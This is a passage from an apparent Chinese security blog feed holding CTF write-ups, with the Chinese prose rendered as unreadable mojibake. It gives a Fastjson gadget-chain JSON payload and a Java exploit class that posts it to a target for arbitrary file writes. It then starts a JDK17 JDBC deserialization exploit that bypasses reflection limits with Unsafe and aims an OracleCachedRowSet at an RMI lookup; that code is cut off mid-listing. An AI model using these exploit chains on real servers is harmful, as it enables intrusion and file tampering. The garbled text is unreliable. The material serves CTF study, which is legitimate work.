è‡ªå¸¦çš„ä¸€ä¸ªç±»ï¼š<code>sun.rmi.server.MarshalOutputStream</code></p><p>å®ƒæ˜¯ObjectOutputStream çš„å­ç±»ï¼›å¹¶ä¸”åœ¨å¯¹è±¡åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<strong>ä¼šè°ƒç”¨å…¶å†…éƒ¨ OutputStream çš„ write æ–¹æ³•</strong>ï¼›ä¹Ÿæ˜¯ JDK RMI æ¨¡å—ä¸­ç”¨äºåºåˆ—åŒ–å¯¹è±¡æ—¶çš„å·¥å…·ç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–è§¦å‘write()ï¼Œå®ç°æ•°æ®æµå†™å…¥ã€‚</p><h5 id="InflaterOutputStream"><a href="#InflaterOutputStream" class="headerlink" title="InflaterOutputStream"></a>InflaterOutputStream</h5><p>æ ‡å‡† JDK ç±»ï¼Œè´Ÿè´£æ¥æ”¶å‹ç¼©æ•°æ® â†’ è§£å‹ â†’ å‘åº•å±‚æµå†™å…¥</p><p>æ‰€ä»¥ç¬¬äºŒä¸ªjsonï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.OutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.app.FilterFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;path&#125;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;ABC&#125;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;limit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;ABCD&#125;&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>â€</p><h3 id="æ€»ä½“æ€è·¯"><a href="#æ€»ä½“æ€è·¯" class="headerlink" title="æ€»ä½“æ€è·¯"></a>æ€»ä½“æ€è·¯</h3><p>è°ƒç”¨getflag()ä¼šè§¦å‘<code>new FilterFileOutputStream(&quot;/flag&quot;, &quot;/&quot;)</code>ã€‚</p><p>è€Œè§¦å‘è°ƒç”¨<code>FilterFileOutputStream</code>ç±»ï¼Œå°±ä¼šè®©æ„é€ å‡½æ•°è°ƒç”¨ super(name) âœ è°ƒç”¨ FileOutputStream(String name) âœ <strong>ä¼šå°è¯•æ‰“å¼€æˆ–æ–°å»ºè¿™ä¸ªæ–‡ä»¶</strong></p><p>ç”±æ­¤ç»“åˆåç»­writeä»»æ„å†™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Fastjson <span class="hljs-title function_">parse</span><span class="hljs-params">()</span><br>  â†“<br>MarshalOutputStream.readObject()<br>  â†“<br>InflaterOutputStream<br>     â””â”€â”€ infl.input.array â†’ base64å‹ç¼©æ•°æ®<br>     â””â”€â”€ infl.limit â†’ è§£å‹åé•¿åº¦<br>  â†“<br>FilterFileOutputStream â†’ æ–‡ä»¶åˆ›å»ºå¹¶å†™å…¥<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆarrayå‹ç¼©æµå³å¯:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123123123123&quot;</span>;<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-keyword">try</span> (<span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream)) &#123;<br>    deflaterOutputStream.write(input.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br><span class="hljs-type">int</span> <span class="hljs-variable">leng</span> <span class="hljs-operator">=</span> byteArrayOutputStream.toByteArray().length;<br>System.out.println(encoded);<br></code></pre></td></tr></table></figure><p>limitè®¾ç½®ä¸ºè§£å‹ç¼©åbyteçš„lengthã€‚</p><p>å€Ÿç”¨mini-venomé˜Ÿçš„wp,æˆåŠŸå®ç°ä»»æ„æ–‡ä»¶å†™:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">sendJson</span><span class="hljs-params">(String payload)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();<br><br>        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">httpHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();<br>        httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);<br><br>        LinkedMultiValueMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMultiValueMap</span>&lt;&gt;();<br>        map.add(<span class="hljs-string">&quot;json&quot;</span>, payload);<br><br>        HttpEntity&lt;LinkedMultiValueMap&lt;Object, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(map, httpHeaders);<br><br>        <span class="hljs-keyword">return</span> restTemplate.postForObject(target, request, String.class);<br>    &#125; <span class="hljs-keyword">catch</span> (RestClientException e) &#123;<br>        <span class="hljs-keyword">return</span><span class="hljs-string">&quot;null&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException, InterruptedException &#123;<br>    <span class="hljs-comment">// 1. add inputStream to fastjson cache</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payloads/step1.json&quot;</span>)));<br>    sendJson(payload1);<br>    System.out.println(payload1);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/eddie.txt&quot;</span>;<br>    <span class="hljs-comment">//String path = &quot;F:\\CTF_Java\\FastJ\\lib\\eddie.txt&quot;;</span><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;EddieMurphy_You_Bet&quot;</span>;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream)) &#123;<br>        deflaterOutputStream.write(input.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>    <span class="hljs-type">int</span> <span class="hljs-variable">leng</span> <span class="hljs-operator">=</span> byteArrayOutputStream.toByteArray().length;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payloads/step2.json&quot;</span>)));<br>    payload2 = payload2.replace(<span class="hljs-string">&quot;&#123;ABC&#125;&quot;</span>, encoded).replace(<span class="hljs-string">&quot;\&quot;&#123;ABCD&#125;\&quot;&quot;</span>,String.valueOf(leng)).replace(<span class="hljs-string">&quot;&#123;path&#125;&quot;</span>,path);<br>    sendJson(payload2);<br>    System.out.println(payload2);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611195649367.png" alt="image-20250611195649367"></p><p>å‚è€ƒé“¾æ¥:</p><p><a href="https://www.cnblogs.com/symv1a/p/18900307/2025-jingqi-ctf-preliminary-competitionweb-z108qvu">2025äº¬éº’CTFåˆèµ›-web - symya - åšå®¢å›­</a></p><p><a href="https://xz.aliyun.com/news/18127">2025äº¬éº’æ¯web-å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/mN_0eiTt-6ToTuRsjt-mrA">2025ç¬¬ä¸‰å±Šäº¬éº’CTFæŒ‘æˆ˜èµ› writeup by Mini-Venom</a></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™é“é¢˜å¯ä»¥å­¦ä¹ ä¸€æ³¢ï¼Œä½†è²Œä¼¼windowsä¸èƒ½ç›´æ¥å†™æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æœºå™¨é…çš„æƒé™åŸå› ã€‚Linuxå°±éšä¾¿æ‰“äº†ã€‚</p><p>åç»­æ›´ä¸€ä¸ªJDBCä¸å‡ºç½‘RCEçš„å¤ç°ã€‚</p><p>ä½†æ˜¯æœ€è¿‘å¿™ç€ä¿ç ”ä¸€å †äº‹,è¿˜è¦æ‰“å·¥ğŸ˜­ğŸ˜­ğŸ˜­,æ‰€ä»¥æ›´ä¸å‹¤äº†â€¦â€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¥è‡ªä¸‰é“é«˜ç‰ˆæœ¬JDKçš„JDBCè¿æ‰“combo</title>
    <link href="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/"/>
    <url>/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¸½äº†å¤ªä¹…ï¼Œä¸Šå‘¨æ‰“äº†ä¸ªè½¯ä»¶å®‰å…¨èµ›åŠå†³ï¼Œå‘ç°å¾ˆå¤šå¥½ç©çš„é«˜ç‰ˆæœ¬JDKçš„JDBCé¢˜ç›®ï¼Œé‚è¶ç€æ²¡å•¥äº‹çš„æ—¶å€™çœ‹çœ‹ã€‚</p><h1 id="å…¶ä¸€-è½¯ä»¶å®‰å…¨èµ›åˆèµ›-JDBCParty"><a href="#å…¶ä¸€-è½¯ä»¶å®‰å…¨èµ›åˆèµ›-JDBCParty" class="headerlink" title="å…¶ä¸€-è½¯ä»¶å®‰å…¨èµ›åˆèµ›-JDBCParty"></a>å…¶ä¸€-è½¯ä»¶å®‰å…¨èµ›åˆèµ›-JDBCParty</h1><p>JDK17æ‰“oracleçš„ååºåˆ—åŒ–ã€‚</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331162957099.png" alt="image-20250331162957099"></p><p>å…¥å£å¾ˆsimpleï¼Œå› ä¸ºgetConnectionå†…æˆ‘ä»¬å¯æ§çš„åªæœ‰usernameå’Œpasswordï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ‰“JDBCäº†ã€‚</p><p>å‰é¢ç»™äº†ä¸ªdeserializeï¼Œåº”è¯¥æ˜¯æ‰“è¿™é‡Œçš„ååºåˆ—åŒ–ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331163110482.png" alt="image-20250331163110482"></p><p>è¿™é‡Œçš„æ‰“æ³•ä¸ä»…ä»…æ˜¯é«˜ç‰ˆæœ¬JDKä¸‹JDBCçš„æ‰“æ³•ï¼Œæ‰“JDBCå‰åŠæ®µå¾ˆç®€å•ï¼Œéƒ½æ˜¯æ‰¾ä¸ªèƒ½è§¦å‘åˆ°<code>getConnection</code>çš„é“¾ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šç§é€‰æ‹©ï¼Œæ¯”å¦‚å‡ºé“å³å·…å³°çš„<code>EventListenerList</code>ï¼Œå…¶äºŒæ˜¯<code>hashtable</code>ï¼Œéƒ½å¯ä»¥ä»<code>toString</code>è°ƒç”¨åˆ°ä»»æ„getterã€‚</p><p>ååŠæ®µå°±æ˜¯ç€é‡è€ƒè™‘çš„é«˜ç‰ˆæœ¬JDKçš„JNDIæ‰“æ³•ã€‚</p><p>é¥­è¦ä¸€å£å£åƒï¼Œè·¯è¦ä¸€æ­¥æ­¥èµ°ã€‚æˆ‘ä»¬å…ˆçœ‹JDBCæ€ä¹ˆæ‰“ã€‚</p><p>é¦–å…ˆå°±æ˜¯JDK17çš„åå°„æœºåˆ¶ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥çœ‹ï¼š</p><p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">JDK17+åå°„é™åˆ¶ç»•è¿‡</a></p><p>æ ¹æ® <a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B">Oracleçš„æ–‡æ¡£</a>ï¼Œä¸ºäº†å®‰å…¨æ€§ï¼Œä»JDK 17å¼€å§‹å¯¹javaæœ¬èº«ä»£ç ä½¿ç”¨å¼ºå°è£…ï¼ŒåŸæ–‡å« <code>Strong Encapsulation</code>ã€‚ä»»ä½•å¯¹ <code>java.*</code> ä»£ç ä¸­çš„<strong>épublic</strong>å˜é‡å’Œæ–¹æ³•è¿›è¡Œåå°„ä¼šæŠ›å‡º<code>InaccessibleObjectException</code>å¼‚å¸¸ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æ˜¯ä½¿ç”¨äº†Unsafeç±»æ¥å®ç°åå°„é™åˆ¶çš„çªç ´ã€‚æœ¬è´¨ä¸Šå³ä¸ºåœ¨jdk17åŠä¹‹åæ— æ³•åå°„ <code>java.*</code> åŒ…ä¸‹é<code>public</code> ä¿®é¥°çš„å±æ€§å’Œæ–¹æ³•ï¼Œé€šè¿‡ <code>UnSafe</code>å®ç°<strong>è°ƒç”¨ç±»çš„moduleå’ŒObjectç±»çš„moduleä¸€æ ·</strong> è¾¾åˆ°å¯ä»¥ä¿®æ”¹çš„ç›®çš„ï¼Œå…·ä½“ä¸å†èµ˜è¿°ã€‚</p><p>å¯¹äºé«˜ç‰ˆæœ¬JDKçš„JNDIçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°èƒ½è§¦å‘getterçš„JNDIã€‚</p><p>è¿™ä¸ªé¡¹ç›®ä¹Ÿå·²ç»ç»™å‡ºï¼š<a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>oracleæ•°æ®åº“æˆ‘ä»¬å¯ä»¥é€‰æ‹©<code>OracleCachedRowSet</code>ä½œä¸ºsinkï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br>oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://localhost:1097/remoteobj&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªsinkçš„é¦–å‘æ˜¯åªèƒ½æ‰“RMIã€‚æˆ‘ä»¬è·Ÿä¸€ä¸‹<code>OracleRowSet</code>å¯ä»¥çœ‹åˆ°é»‘åå•ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331164035491.png" alt="image-20250331164035491"></p><p>å”¯ç‹¬RMIæ²¡banã€‚</p><h3 id="EXP-JDBCåˆ°JNDI"><a href="#EXP-JDBCåˆ°JNDI" class="headerlink" title="EXP-JDBCåˆ°JNDI"></a>EXP-JDBCåˆ°JNDI</h3><p>æ­¤å¤„å°±ä»¥é‚£ä½å‡ºé“å³å·…å³°çš„<code>EventListenerList</code>ä¸‹æ‰‹ï¼Œå€Ÿç”¨ä¸€éƒ¨åˆ†j1rryå¸ˆå‚…çš„ä»£ç ï¼Œæ³¨æ„è¿˜æ˜¯è¦å…ˆæŠŠJacksoné“¾ä¸­çš„<code>writeReplace</code>ç»™åˆ äº†ï¼Œä¸ç„¶ä¼šæå‰è§¦å‘å°±æ‰“å°ä¸å‡ºpayloadäº†ï¼ŒåŒæ—¶è®°å¾—æ·»åŠ VM Optionsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp_EventListenerList</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="hljs-literal">false</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> Object.class.getModule();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> Exp_EventListenerList.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(currentClass, addr, baseModule);<br>        <span class="hljs-comment">//User user = new User();</span><br>        <span class="hljs-comment">//å¯¹äºæ˜¯å¦è§¦å‘åˆ°getteræ–¹æ³•å®ç°çš„æ—¶å€™ å¯ä»¥è€ƒè™‘æœ¬åœ°å®ç°ä¸€ä¸ªç±»çœ‹çœ‹</span><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://localhost:1097/remoteobj&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">MemoryUserDatabaseFactory</span>();<br><br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;monitorLock&quot;</span>),<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        vector1.add(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;111&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        vector2.add(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;222&quot;</span>);<br>        String[] metaData= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;222&quot;</span>&#125;;<br><br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;matchColumnIndexes&quot;</span>),vector1);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;matchColumnNames&quot;</span>),vector2);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;metaData&quot;</span>),metaData);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;reader&quot;</span>),<span class="hljs-literal">null</span>);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;writer&quot;</span>),<span class="hljs-literal">null</span>);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;syncProvider&quot;</span>),<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(oracleCachedRowSet);<br><br><br>        <span class="hljs-comment">//toStringè§¦å‘åˆ°getteræ–¹æ³•</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br> 